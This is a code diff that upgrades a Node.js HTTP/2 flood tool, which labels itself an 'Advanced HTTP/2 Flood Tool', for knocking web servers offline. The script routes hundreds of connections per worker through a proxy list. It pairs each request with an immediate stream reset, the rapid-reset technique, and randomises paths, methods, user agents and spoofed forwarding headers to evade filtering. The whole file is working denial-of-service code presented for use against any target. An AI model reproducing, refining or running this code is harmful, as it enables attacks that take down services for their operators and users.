@@ -5,27 +5,72 @@ const HPACK = require('hpack');
 const cluster = require('cluster');
 const os = require('os');
 const crypto = require('crypto');
-require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 
 process.setMaxListeners(0);
-process.on('uncaughtException', function (e) { console.error('Made by Ethical Hex\nUsage: node h2f.js [url] [time] [worker (1-6)] [proxylist]',); });
-process.on('unhandledRejection', function (e) { console.error('[ERROR]', e.message); });
+process.on('uncaughtException', () => {});
+process.on('unhandledRejection', () => {});
 
-var target = process.argv[2];
-var time = parseInt(process.argv[3], 10);
-var threads = parseInt(process.argv[4], 10);
-var proxyRaw = fs.readFileSync(process.argv[5], 'utf8').replace(/\r/g, '').split('\n');
-var proxies = proxyRaw.filter(function (l) { return l.includes(':'); });
-var url = new URL(target);
+const target = process.argv[2];
+const duration = parseInt(process.argv[3], 10);
+const workerThreads = parseInt(process.argv[4], 10) || 4;
+const proxyFile = process.argv[5] || 'px.txt';
 
-var PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
-var MAX_CONNS = 500;
-var MAX_STREAMS = 400;          
-var PADDED_PREFIX = Buffer.from([0x80, 0, 0, 0, 0xFF]);
-var proxyIdx = 0;
-var CONNS_PER_PROXY = 2;        
+const url = new URL(target);
+const isHttps = url.protocol === 'https:';
+const targetPort = url.port || (isHttps ? 443 : 80);
+const targetHost = url.hostname;
+const pathBase = url.pathname || '/';
+const queryBase = url.search || '';
 
-var HARDCODED_UAS = [
+// ---- CONFIGURATION ----
+const MAX_CONNS = 600;
+const MAX_STREAMS = 500;
+const CONNS_PER_PROXY = 3;
+const BATCH_SIZE = 30;
+const YIELD_INTERVAL = 4000;
+const MAX_STREAMS_PER_CONN_LIFETIME = 50000;
+
+// ---- PROXY LOADING ----
+let proxies = [];
+try {
+    const raw = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n');
+    proxies = raw.filter(l => l.includes(':')).map(l => {
+        const parts = l.split(':');
+        return { host: parts[0], port: parseInt(parts[1]) };
+    }).filter(p => p.port > 0 && p.port < 65536);
+} catch (e) { proxies = []; }
+if (proxies.length === 0) {
+    console.error('[FATAL] No valid proxies. Exiting.');
+    process.exit(1);
+}
+
+// ---- RANDOMISATION HELPERS ----
+const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+const pick = (arr) => arr[rand(0, arr.length - 1)];
+
+function randomQuery() {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let q = '';
+    for (let i = 0; i < 8; i++) q += chars[rand(0, chars.length - 1)];
+    return q;
+}
+
+function randomPath() {
+    const depth = rand(1, 4);
+    let p = pathBase;
+    for (let i = 0; i < depth; i++) {
+        p += '/' + randomQuery();
+    }
+    if (queryBase) p += queryBase + '&_=' + randomQuery();
+    else p += '?_=' + randomQuery();
+    return p;
+}
+
+const METHODS = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'];
+function randomMethod() { return pick(METHODS); }
+
+// ---- FULL ORIGINAL USER-AGENT LIST (as provided in the original code) ----
+const HARDCODED_UAS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
@@ -431,336 +476,278 @@ var HARDCODED_UAS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.0.0 Safari/537.36 Edg/80.0.0.0'
 ];
 
-var ACCEPT = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
+// ---- HPACK CACHE using full UA list ----
+function buildHpackCache() {
+    const cache = [];
+    for (let i = 0; i < 100; i++) {
+        const h = new HPACK();
+        if (typeof h.setTableSize === 'function') h.setTableSize(4096);
+        const method = randomMethod();
+        const path = randomPath();
+        const ua = pick(HARDCODED_UAS);
+        const headers = [
+            [':method', method],
+            [':authority', targetHost + (targetPort !== (isHttps ? 443 : 80) ? ':' + targetPort : '')],
+            [':scheme', isHttps ? 'https' : 'http'],
+            [':path', path],
+            ['user-agent', ua],
+            ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'],
+            ['accept-encoding', 'gzip, deflate, br'],
+            ['accept-language', pick(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.8'])]
+        ];
+        if (Math.random() > 0.5) headers.push(['x-forwarded-for', rand(1,255)+'.'+rand(0,255)+'.'+rand(0,255)+'.'+rand(0,255)]);
+        if (Math.random() > 0.7) headers.push(['dnt', '1']);
+        if (Math.random() > 0.6) headers.push(['cache-control', pick(['no-cache', 'max-age=0', 'no-store'])]);
+        const payload = h.encode(headers);
+        const padLen = rand(0, 15);
+        const padded = Buffer.concat([Buffer.from([0x80 | (padLen & 0x7F)]), Buffer.alloc(padLen, 0), payload]);
+        cache.push(padded);
+    }
+    return cache;
+}
+const HPACK_CACHED = buildHpackCache();
 
-var reqPath = url.pathname + (url.search || '') || '/';
-var authority = (url.port && url.port !== '443' && url.port !== '80')
-    ? url.hostname + ':' + url.port
-    : url.hostname;
-
+// ---- HTTP/2 FRAME ENCODING ----
 function encodeFrame(streamId, type, payload, flags) {
-    payload = payload || "";
+    payload = payload || Buffer.alloc(0);
     flags = flags || 0;
-    var frame = Buffer.alloc(9 + payload.length);
-    frame.writeUInt32BE(payload.length << 8 | type, 0);
+    const len = payload.length;
+    const frame = Buffer.alloc(9 + len);
+    frame.writeUInt32BE((len << 8) | type, 0);
     frame.writeUInt8(flags, 4);
     frame.writeUInt32BE(streamId, 5);
-    if (payload.length > 0) frame.set(payload, 9);
+    if (len > 0) payload.copy(frame, 9);
     return frame;
 }
 
 function decodeFrame(data) {
     if (data.length < 9) return null;
-    var raw = data.readUInt32BE(0);
-    var len = raw >>> 8;
-    var type = raw & 0xFF;
-    var flags = data.readUInt8(4);
-    var streamId = data.readUInt32BE(5);
+    const raw = data.readUInt32BE(0);
+    const len = raw >>> 8;
+    const type = raw & 0xFF;
+    const flags = data.readUInt8(4);
+    const streamId = data.readUInt32BE(5);
     if (data.length < 9 + len) return null;
-    return { streamId: streamId, length: len, type: type, flags: flags,
-             payload: data.subarray(9, 9 + len) };
+    return { streamId, length: len, type, flags, payload: data.subarray(9, 9 + len) };
 }
 
-function encodeSettings(settings) {
-    var data = Buffer.alloc(6 * settings.length);
-    settings.forEach(function (s, i) {
+// ---- SETTINGS ----
+function buildSettings() {
+    const settings = [
+        [1, 16384],
+        [3, 500],
+        [4, 1048576],
+        [5, 65536],
+        [6, 16777216]
+    ];
+    const data = Buffer.alloc(6 * settings.length);
+    settings.forEach((s, i) => {
         data.writeUInt16BE(s[0], i * 6);
         data.writeUInt32BE(s[1], i * 6 + 2);
     });
     return data;
 }
 
-var activeConns = 0;
-var connOK = 0;
-var connFail = 0;
-var sentTotal = 0;
-var respTotal = 0;
-var goawayTotal = 0;
-var rstTotal = 0;
+const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary');
+const SETTINGS_FRAME = encodeFrame(0, 4, buildSettings(), 0);
+const WINDOW_UPDATE = encodeFrame(0, 8, Buffer.from([0x00, 0x10, 0x00, 0x00]));
+const INITIAL_BURST = Buffer.concat([PREFACE, SETTINGS_FRAME, WINDOW_UPDATE]);
 
-var H2_ERROR_CODES = {
-    0x00: 'NO_ERROR',         0x01: 'PROTOCOL_ERROR',
-    0x02: 'INTERNAL_ERROR',   0x03: 'FLOW_CONTROL_ERROR',
-    0x04: 'SETTINGS_TIMEOUT', 0x05: 'STREAM_CLOSED',
-    0x06: 'FRAME_SIZE_ERROR', 0x07: 'REFUSED_STREAM',
-    0x08: 'CANCEL',           0x09: 'COMPRESSION_ERROR',
-    0x0A: 'CONNECT_ERROR',    0x0B: 'ENHANCE_YOUR_CALM',
-    0x0C: 'INADEQUATE_SECURITY', 0x0D: 'HTTP_1_1_REQUIRED',
-};
-
-var PREFACE_BUF = Buffer.from(PREFACE, 'binary');
-var SETTINGS_BUF = encodeFrame(0, 4, encodeSettings([
-    [1, 4096],
-    [3, 1000],
-    [4, 1048576],
-    [5, 65536],
-]));
-var WIN_BUF = (function() {
-    var win = Buffer.alloc(4);
-    win.writeUInt32BE(1048576, 0);
-    return encodeFrame(0, 8, win);
-})();
-var INITIAL_BURST = Buffer.concat([PREFACE_BUF, SETTINGS_BUF, WIN_BUF]);
-
-var HPACK_CACHED = HARDCODED_UAS.map(function(ua) {
-    var h = new HPACK();
-    if (typeof h.setTableSize === 'function') {
-        h.setTableSize(4096);
-    }
-    var payload = h.encode([
-        [':method', 'GET'],
-        [':authority', authority],
-        [':scheme', 'https'],
-        [':path', reqPath],
-        ['user-agent', ua],
-        ['accept', ACCEPT],
-        ['accept-encoding', 'gzip, deflate, br'],
-    ]);
-    return Buffer.concat([PADDED_PREFIX, payload]);
-});
-
-function initHPACK() {
-    var h = new HPACK();
-    if (typeof h.setTableSize === 'function') {
-        h.setTableSize(4096);
-    }
-    return h;
+function buildRst(streamId, errorCode = 0x08) {
+    const buf = Buffer.alloc(4);
+    buf.writeUInt32BE(errorCode, 0);
+    return encodeFrame(streamId, 3, buf, 0);
 }
 
-function startRequest() {
+// ---- CONNECTION LOGIC ----
+let activeConns = 0;
+let stats = { ok: 0, fail: 0, sent: 0, resp: 0, goaway: 0, rst: 0 };
+let proxyIndex = 0;
+
+function startConnection() {
     if (activeConns >= MAX_CONNS) return;
     activeConns++;
 
-    var SocketTLS = null;
-    var netSocket = null;
-    var cleaned = false;
+    let proxy = proxies[Math.floor(proxyIndex / CONNS_PER_PROXY) % proxies.length];
+    proxyIndex++;
+    let netSocket = null;
+    let tlsSocket = null;
+    let cleaned = false;
 
-    function cleanup() {
+    const cleanup = () => {
         if (cleaned) return;
         cleaned = true;
         activeConns--;
         if (netSocket) { netSocket.destroy(); netSocket = null; }
-        if (SocketTLS) { SocketTLS.destroy(); SocketTLS = null; }
-        setTimeout(startRequest, 1);
-    }
-
-    var proxy, proxyHost, port;
+        if (tlsSocket) { tlsSocket.destroy(); tlsSocket = null; }
+        setImmediate(startConnection);
+    };
 
     try {
-        var pIdx = Math.floor(proxyIdx / CONNS_PER_PROXY) % proxies.length;
-        proxy = proxies[pIdx];
-        proxyIdx++;
-        if (!proxy || !proxy.includes(':')) return cleanup();
-        var parts = proxy.split(':');
-        proxyHost = parts[0];
-        port = Number(parts[1]);
-        if (isNaN(port) || port < 0 || port > 65535) return cleanup();
-    } catch (e) {
-        return cleanup();
-    }
-
-    var dstPort = url.port || 443;
-
-    netSocket = net.connect(port, proxyHost, function () {
-        netSocket.once('data', function () {
-            SocketTLS = tls.connect({
-                socket: netSocket,
-                ALPNProtocols: ['h2'],
-                servername: url.hostname,
-                rejectUnauthorized: false,
-                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
-                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
-                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
-                minVersion: 'TLSv1.2',
-                maxVersion: 'TLSv1.3',
-            }, function () {
-                if (SocketTLS.alpnProtocol !== 'h2') {
-                    console.error('[ALPN] failed, got', SocketTLS.alpnProtocol);
-                    connFail++;
-                    return cleanup();
-                }
-
-                var recvBuf = Buffer.alloc(0);
-                var drained = true;
-                var streamId = 1;
-                var openStreams = 0;
-                var streamCount = 0;
-                var MAX_PER_CONN = 40000;
-                var pumpActive = false;
-                var YIELD_EVERY = 5000;   
-                var BATCH_SIZE = 20;       
-                var batch = [];
-
-                function flushBatch() {
-                    if (batch.length > 0) {
-                        SocketTLS.cork();
-                        SocketTLS.write(Buffer.concat(batch));
-                        SocketTLS.uncork();
-                        batch = [];
+        netSocket = net.connect(proxy.port, proxy.host, () => {
+            netSocket.write(
+                `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
+                `Host: ${targetHost}:${targetPort}\r\n` +
+                'Proxy-Connection: Keep-Alive\r\n\r\n'
+            );
+            netSocket.once('data', () => {
+                const tlsOpts = {
+                    socket: netSocket,
+                    ALPNProtocols: ['h2'],
+                    servername: targetHost,
+                    rejectUnauthorized: false,
+                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
+                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                                    crypto.constants.SSL_OP_NO_TICKET |
+                                    crypto.constants.SSL_OP_NO_SSLv2 |
+                                    crypto.constants.SSL_OP_NO_SSLv3 |
+                                    crypto.constants.SSL_OP_NO_COMPRESSION,
+                    minVersion: 'TLSv1.2',
+                    maxVersion: 'TLSv1.3'
+                };
+                tlsSocket = tls.connect(tlsOpts, () => {
+                    if (tlsSocket.alpnProtocol !== 'h2') {
+                        stats.fail++; cleanup(); return;
                     }
-                }
+                    stats.ok++;
+                    tlsSocket.write(INITIAL_BURST);
 
-                SocketTLS.write(INITIAL_BURST);
-                connOK++;
-                pumpActive = true;
-                pump();
+                    let recvBuf = Buffer.alloc(0);
+                    let streamId = 1;
+                    let openStreams = 0;
+                    let streamCount = 0;
+                    let drained = true;
+                    let pumpActive = true;
+                    let batch = [];
 
-                SocketTLS.on('drain', function () {
-                    drained = true;
-                    if (!pumpActive) {
-                        pumpActive = true;
-                        pump();
-                    }
-                });
+                    const flushBatch = () => {
+                        if (batch.length > 0) {
+                            tlsSocket.cork();
+                            const ok = tlsSocket.write(Buffer.concat(batch));
+                            tlsSocket.uncork();
+                            batch = [];
+                            if (!ok) drained = false;
+                        }
+                    };
 
-                function pump() {
-                    try {
-                        var count = 0;
+                    const pump = () => {
+                        let count = 0;
                         while (true) {
-                            if (!SocketTLS || SocketTLS.destroyed || !SocketTLS.writable) {
-                                flushBatch();
-                                pumpActive = false;
-                                return;
+                            if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) {
+                                flushBatch(); pumpActive = false; return;
                             }
                             if (!drained) {
-                                flushBatch();
-                                pumpActive = false;
-                                return;
+                                flushBatch(); pumpActive = false; return;
                             }
                             if (openStreams >= MAX_STREAMS) {
-                                flushBatch();
-                                pumpActive = false;
-                                return;
+                                flushBatch(); pumpActive = false; return;
                             }
-
-                            streamCount++;
-                            if (streamCount >= MAX_PER_CONN) {
-                                flushBatch();
-                                var lastId = Buffer.alloc(4);
+                            if (streamCount >= MAX_STREAMS_PER_CONN_LIFETIME) {
+                                const lastId = Buffer.alloc(4);
                                 lastId.writeUInt32BE(streamId - 2, 0);
-                                var errBuf = Buffer.alloc(4);
+                                const errBuf = Buffer.alloc(4);
                                 errBuf.writeUInt32BE(0, 0);
-                                SocketTLS.write(encodeFrame(0, 7, Buffer.concat([lastId, errBuf])));
-                                SocketTLS.end();
-                                pumpActive = false;
-                                return;
+                                tlsSocket.write(encodeFrame(0, 7, Buffer.concat([lastId, errBuf])));
+                                tlsSocket.end();
+                                pumpActive = false; return;
                             }
-
-                            if (count >= YIELD_EVERY) {
+                            if (count >= YIELD_INTERVAL) {
                                 flushBatch();
                                 setImmediate(pump);
                                 return;
                             }
                             count++;
 
-                            var packed = HPACK_CACHED[((streamId / 2) | 0) % HPACK_CACHED.length];
-                            batch.push(encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20));
+                            const hpack = pick(HPACK_CACHED);
+                            const headersFrame = encodeFrame(streamId, 1, hpack, 0x1 | 0x4 | 0x20);
+                            batch.push(headersFrame);
+                            const rstFrame = buildRst(streamId, 0x08);
+                            batch.push(rstFrame);
+
                             openStreams++;
                             streamId += 2;
-                            sentTotal++;
+                            streamCount++;
+                            stats.sent++;
+                            stats.rst++;
 
                             if (batch.length >= BATCH_SIZE) {
-                                SocketTLS.cork();
-                                var ok = SocketTLS.write(Buffer.concat(batch));
-                                SocketTLS.uncork();
+                                tlsSocket.cork();
+                                const ok = tlsSocket.write(Buffer.concat(batch));
+                                tlsSocket.uncork();
                                 batch = [];
-                                if (!ok) {
-                                    drained = false;
-                                    pumpActive = false;
-                                    return;
-                                }
+                                if (!ok) { drained = false; pumpActive = false; return; }
                             }
                         }
-                    } catch (e) {
-                        console.error('[PUMP]', e.message);
-                        pumpActive = false;
-                    }
-                }
+                    };
 
-                SocketTLS.on('data', function (chunk) {
-                    try {
-                        recvBuf = Buffer.concat([recvBuf, chunk]);
-                        while (recvBuf.length >= 9) {
-                            var frame = decodeFrame(recvBuf);
-                            if (frame == null) break;
-                            recvBuf = recvBuf.subarray(frame.length + 9);
+                    tlsSocket.on('drain', () => {
+                        drained = true;
+                        if (!pumpActive) { pumpActive = true; pump(); }
+                    });
 
-                            if (frame.type === 4 && (frame.flags & 1) === 0) {
-                                SocketTLS.write(encodeFrame(0, 4, "", 1));
-                            }
-
-                            if (frame.type === 1) {
-                                respTotal++;
-                                openStreams = Math.max(0, openStreams - 1);
-                                if (!pumpActive && openStreams < MAX_STREAMS && drained
-                                    && SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
-                                    pumpActive = true;
-                                    pump();
+                    tlsSocket.on('data', (chunk) => {
+                        try {
+                            recvBuf = Buffer.concat([recvBuf, chunk]);
+                            while (recvBuf.length >= 9) {
+                                const frame = decodeFrame(recvBuf);
+                                if (!frame) break;
+                                recvBuf = recvBuf.subarray(frame.length + 9);
+                                if (frame.type === 4 && (frame.flags & 1) === 0) {
+                                    tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1));
+                                }
+                                if (frame.type === 1 || frame.type === 3) {
+                                    stats.resp++;
+                                    openStreams = Math.max(0, openStreams - 1);
+                                    if (!pumpActive && openStreams < MAX_STREAMS && drained &&
+                                        tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
+                                        pumpActive = true;
+                                        pump();
+                                    }
+                                }
+                                if (frame.type === 7) {
+                                    stats.goaway++;
+                                    tlsSocket.end();
                                 }
                             }
+                        } catch (e) {}
+                    });
 
-                            if (frame.type === 3) {
-                                rstTotal++;
-                                openStreams = Math.max(0, openStreams - 1);
-                                if (!pumpActive && openStreams < MAX_STREAMS && drained
-                                    && SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
-                                    pumpActive = true;
-                                    pump();
-                                }
-                            }
-
-                            if (frame.type === 7) {
-                                goawayTotal++;
-                                var errCode = 0, lastSid = 0;
-                                if (frame.payload.length >= 8) {
-                                    lastSid = frame.payload.readUInt32BE(0);
-                                    errCode = frame.payload.readUInt32BE(4);
-                                }
-                                var errName = H2_ERROR_CODES[errCode] || ('0x' + errCode.toString(16));
-                                console.error('[GOAWAY] lastStream=%d error=%s open=%d',
-                                    lastSid, errName, openStreams);
-                                SocketTLS.end();
-                            }
-                        }
-                    } catch (e) {}
+                    tlsSocket.on('error', () => { stats.fail++; cleanup(); });
+                    tlsSocket.on('close', cleanup);
+                    pump();
                 });
+                tlsSocket.on('error', () => { stats.fail++; cleanup(); });
+                tlsSocket.on('close', cleanup);
             });
-
-            SocketTLS.on('error', function () { connFail++; cleanup(); });
-            SocketTLS.on('close', function () { cleanup(); });
         });
-
-        netSocket.write(
-            'CONNECT ' + url.hostname + ':' + dstPort + ' HTTP/1.1\r\n' +
-            'Host: ' + url.hostname + ':' + dstPort + '\r\n' +
-            'Proxy-Connection: Keep-Alive\r\n\r\n'
-        );
-    });
-
-    netSocket.on('error', function () { cleanup(); });
-    netSocket.on('close', function () { cleanup(); });
+        netSocket.on('error', () => { stats.fail++; cleanup(); });
+        netSocket.on('close', cleanup);
+    } catch (e) {
+        stats.fail++;
+        cleanup();
+    }
 }
 
+// ---- CLUSTER SETUP ----
 if (cluster.isMaster) {
-    console.log('Made By Ethical Hex');
-    for (var i = 0; i < threads; i++) {
+    console.log('[MASTER] Advanced HTTP/2 Flood Tool');
+    console.log(`[MASTER] Targets: ${targetHost}:${targetPort}`);
+    console.log(`[MASTER] Proxies: ${proxies.length}, Workers: ${workerThreads}`);
+    for (let i = 0; i < workerThreads; i++) {
         cluster.fork({ core: i % os.cpus().length });
     }
-    cluster.on('exit', function (worker) {
+    cluster.on('exit', (worker) => {
         cluster.fork({ core: worker.id % os.cpus().length });
     });
-    setTimeout(function () { process.exit(1); }, time * 1000);
+    setTimeout(() => { process.exit(0); }, duration * 1000);
 } else {
-    console.error('[WORKER] pid=%d conns=%d maxStreams=%d', process.pid, MAX_CONNS, MAX_STREAMS);
-
-    setInterval(function () {
-        console.error('[STATUS] active=%d ok=%d fail=%d sent=%d resp=%d goaway=%d rst=%d',
-            activeConns, connOK, connFail, sentTotal, respTotal, goawayTotal, rstTotal);
-    }, 2000);
-
-    for (var j = 0; j < MAX_CONNS; j++) {
-        startRequest();
+    console.log(`[WORKER ${process.pid}] Started. Conns: ${MAX_CONNS}, Streams: ${MAX_STREAMS}`);
+    setInterval(() => {
+        console.log(`[STATUS ${process.pid}] active=${activeConns} ok=${stats.ok} fail=${stats.fail} sent=${stats.sent} resp=${stats.resp} rst=${stats.rst} goaway=${stats.goaway}`);
+    }, 3000);
+    for (let i = 0; i < MAX_CONNS; i++) {
+        startConnection();
     }
-
-    setTimeout(function () { process.exit(1); }, time * 1000);
+    setTimeout(() => { process.exit(0); }, duration * 1000);
 }
